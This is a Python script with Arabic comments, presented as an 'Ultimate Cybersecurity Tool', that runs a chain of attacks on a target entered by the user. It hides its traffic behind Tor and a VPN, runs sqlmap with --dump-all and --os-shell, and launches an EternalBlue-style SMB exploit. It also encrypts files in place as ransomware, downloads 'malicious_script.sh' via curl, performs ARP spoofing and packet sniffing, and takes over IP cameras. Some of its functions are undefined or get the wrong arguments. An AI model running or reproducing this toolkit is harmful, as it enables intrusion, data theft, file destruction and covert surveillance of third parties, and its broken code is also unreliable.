import os
import socket
import subprocess
import requests
import logging
import random
import string
import base64
import hashlib
import re
import threading
import json
import platform
import urllib.request
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import socks
import ssl
from nmap import PortScanner
from impacket import smb
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pyautogui
import pyaudio
import wave
import shutil
import cv2
from onvif import ONVIFCamera

# ========================
# إعدادات السجل
# ========================
LOG_FILE = 'ultimate_cyber_tool_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ========================
# وظائف المساعدة العامة
# ========================
def request_permission(tool_name, description):
    """
    طلب إذن المستخدم لتشغيل أداة معينة.
    """
    print(f"[INFO] {tool_name}: {description}")
    choice = input(f"[?] Do you want to proceed with {tool_name}? (y/n): ").strip().lower()
    return choice == 'y'

def is_ip_address(target):
    """
    التحقق إذا كان الهدف عنوان IP.
    """
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(ip_pattern, target))

def resolve_url_to_ip(url):
    """
    تحويل URL إلى عنوان IP.
    """
    try:
        ip = socket.gethostbyname(url)
        logging.info(f"Resolved {url} to IP {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve {url} to IP: {e}")
        return None

def save_to_logfile(content, filename="tool_output.log"):
    """
    حفظ نتائج الأداة إلى ملف.
    """
    try:
        with open(filename, "a") as file:
            file.write(content + "\n")
        logging.info(f"Output saved to {filename}")
    except Exception as e:
        logging.error(f"Failed to save output to {filename}: {e}")

# ========================
# وظائف التخفي
# ========================
def configure_stealth_mode():
    """
    إعداد بيئة التخفي باستخدام Tor و VPN.
    """
    try:
        logging.info("Configuring stealth mode...")
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        subprocess.run(["openvpn", "--config", "vpn_config.ovpn"], shell=True)
        logging.info("Stealth mode configured.")
    except Exception as e:
        logging.error(f"Stealth mode configuration failed: {e}")

# ========================
# وظائف الكشف
# ========================
def run_testssl(target):
    """
    تشغيل TestSSL للكشف عن ثغرات SSL.
    """
    if not request_permission("TestSSL", "Check SSL vulnerabilities?"):
        return
    try:
        command = [
            "./testssl.sh", "--vulnerable", "--severity", "HIGH", "--full", "--sneaky",
            "--show-each", "--wide", "--color", "3", "--json-pretty", "--html",
            "--logfile", "deep_scan_result.log", "--assume-http", "--ids-friendly",
            "--debug", "6", "--openssl", "/usr/bin/openssl", "--connect-timeout", "5",
            "--openssl-timeout", "5", target
        ]
        subprocess.run(command)
    except Exception as e:
        logging.error(f"TestSSL failed: {e}")

def run_nmap(target):
    """
    تشغيل Nmap باستخدام الخيارات المحددة.
    إذا كان الهدف URL سيتم تحويله إلى IP أولاً.
    """
    if not request_permission("Nmap", "Run Nmap to scan the target?"):
        return
    try:
        # التحقق من إذا كان الهدف عنوان URL وتحويره إلى IP
        if not is_ip_address(target):
            target_ip = resolve_url_to_ip(target)
            if target_ip is None:
                return  # إلغاء الفحص إذا فشل تحويل الـ URL إلى IP
        else:
            target_ip = target
        
        logging.info(f"Running Nmap on {target_ip}...")
        command = [
            "nmap", "-sS", "-sU", "-T4", "-A", "-v", target_ip
        ]
        subprocess.run(command)
    except Exception as e:
        logging.error(f"Nmap failed: {e}")

# ========================
# وظائف الهجمات
# ========================
def run_sqlmap(target):
    """
    تشغيل SQLMap لاستغلال ثغرات SQL Injection.
    """
    try:
        subprocess.run([ 
            "sqlmap", "-u", f"{target}?id=1 OR 1=1", "--batch", "--level=5", "--risk=3",
            "--tamper=space2comment,charencode,randomcase,between", "--random-agent",
            "--crawl=10", "--threads=10", "--technique=BEUSTQ", "--time-sec=10",
            "--output-dir=sqlmap_output", "--dbs", "--dump-all", "--forms", "--smart", "--os-shell"
        ])
    except Exception as e:
        logging.error(f"SQLMap failed: {e}")

def exploit_smb(target_ip):
    """
    استغلال SMB (مثل EternalBlue).
    """
    if not request_permission("SMB Exploit", f"Attempt SMB exploitation on {target_ip}?"):
        return
    try:
        logging.info(f"Exploiting SMB on {target_ip}...")
        smb_exploit_script = "path/to/smb_exploit.py"
        subprocess.run(["python3", smb_exploit_script, target_ip])
    except Exception as e:
        logging.error(f"SMB exploit failed: {e}")

def deploy_ransomware(target_directory):
    """
    تنفيذ برمجية فدية (محاكاة).
    """
    if not request_permission("Ransomware", "Deploy ransomware on the target?"):
        return
    try:
        logging.info("Deploying ransomware...")
        key, salt = generate_aes_key()
        for root, _, files in os.walk(target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                with open(filepath, "rb") as f:
                    encrypted_data = encrypt_data(f.read().decode(errors="ignore"), key)
                with open(filepath, "wb") as f:
                    f.write(encrypted_data)
        logging.info("Ransomware deployed successfully.")
    except Exception as e:
        logging.error(f"Ransomware deployment failed: {e}")

def deploy_spyeyebotnet(target_ip):
    """
    نشر SpyEye Botnet (محاكاة).
    """
    if not request_permission("SpyEyeBotnet", f"Deploy SpyEye Botnet on {target_ip}?"):
        return
    try:
        logging.info(f"Deploying SpyEye Botnet on {target_ip}...")
        subprocess.run(["curl", f"http://{target_ip}/malicious_script.sh", "-O"])  # مثال لتحميل سكربت ضار
        logging.info("SpyEye Botnet deployed successfully.")
    except Exception as e:
        logging.error(f"SpyEye Botnet deployment failed: {e}")

def deploy_malware(target_ip):
    """
    نشر البرامج الضارة (محاكاة).
    """
    if not request_permission("Deploy Malware", f"Deploy malware on {target_ip}?"):
        return
    try:
        logging.info(f"Deploying malware on {target_ip}...")
        subprocess.run(["curl", f"http://{target_ip}/malicious_script.sh", "-O"])  # مثال لتحميل سكربت ضار
        logging.info("Malware deployed successfully.")
    except Exception as e:
        logging.error(f"Malware deployment failed: {e}")

def perform_spoofing_attack(target_ip):
    """
    تنفيذ هجوم Spoofing.
    """
    if not request_permission("Spoofing Attack", f"Perform spoofing attack on {target_ip}?"):
        return
    try:
        logging.info(f"Performing spoofing attack on {target_ip}...")
        subprocess.run(["arpspoof", "-i", "eth0", "-t", target_ip, "192.168.1.1"])
        logging.info("Spoofing attack completed.")
    except Exception as e:
        logging.error(f"Spoofing attack failed: {e}")

def sniff_traffic(interface):
    """
    التقاط وتحليل الحزم باستخدام Wireshark أو tcpdump.
    """
    if not request_permission("Sniffing", f"Sniff traffic on {interface}?"):
        return
    try:
        logging.info(f"Sniffing traffic on {interface}...")
        subprocess.run(["tcpdump", "-i", interface, "-w", "capture.pcap"])
        logging.info("Traffic sniffing completed.")
    except Exception as e:
        logging.error(f"Traffic sniffing failed: {e}")

def hack_and_monitor_ip_camera(target_ip, username, password):
    """
    اختراق كاميرا المراقبة و مراقبتها.
    """
    if not request_permission("Hack & Monitor IP Camera", f"Hack & monitor IP camera {target_ip}?"):
        return
    try:
        camera = ONVIFCamera(target_ip, 8080, username, password)
        media_service = camera.create_media_service()
        profiles = media_service.GetProfiles()
        logging.info(f"Monitoring camera {target_ip}...")
        camera_ptz = camera.create_ptz_service()
        camera_ptz.ContinuousMove({"x": 0.5, "y": 0.5})
        logging.info("Camera is being monitored.")
    except Exception as e:
        logging.error(f"Failed to hack & monitor IP camera: {e}")

# ========================
# الوظيفة الرئيسية
# ========================
def main():
    target = input("Enter the target IP or URL: ").strip()  # إدخال الهدف من قبل المستخدم

    print("[INFO] Ultimate Cybersecurity Tool Starting...")
    configure_stealth_mode()

    # اختر الأداة التي تريد استخدامها
    actions = [
        ("Run Nmap", run_nmap),
        ("Run TestSSL", run_testssl),
        ("Run SQLMap", run_sqlmap),
        ("Exploit SMB", exploit_smb),
        ("Deploy Ransomware", deploy_ransomware),
        ("Deploy SpyEye Botnet", deploy_spyeyebotnet),
        ("Deploy Malware", deploy_malware),
        ("Perform Spoofing Attack", perform_spoofing_attack),
        ("Sniff Traffic", sniff_traffic),
        ("Hack & Monitor IP Camera", hack_and_monitor_ip_camera)
    ]

    for action_name, action_func in actions:
        action_func(target)

# ========================
# بدء البرنامج
# ========================
if __name__ == "__main__":
    main()  # لا حاجة لإدخال IP يدويًا بعد الآن
